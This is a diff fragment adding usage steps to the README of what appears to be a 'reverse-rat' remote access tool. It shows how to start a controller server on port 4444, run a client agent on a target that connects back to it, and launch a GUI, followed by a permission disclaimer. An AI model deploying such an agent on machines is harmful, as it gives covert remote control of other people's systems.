@@ -55,3 +55,29 @@ Start the server, select a session, and send commands.
 
 Use only on systems you own or have explicit permission to test.
 ```
+
+How to use:
+
+```bash
+# 1. Create the folder and files
+mkdir reverse-rat
+cd reverse-rat
+# ... save all files above ...
+
+# 2. (Optional) create the zip
+chmod +x build_zip.sh
+./build_zip.sh
+
+# 3. Run the server (controller) in Linux CLI
+python3 server.py --host 0.0.0.0 --port 4444 --token Sup3rSecret
+
+# 4. On the target, run the client agent
+python3 client.py --host 192.168.1.100 --port 4444 --token Sup3rSecret
+
+# 5. For a basic GUI
+python3 gui.py
+```
+
+---
+
+Use it responsibly — only on machines you own or have written permission to test.
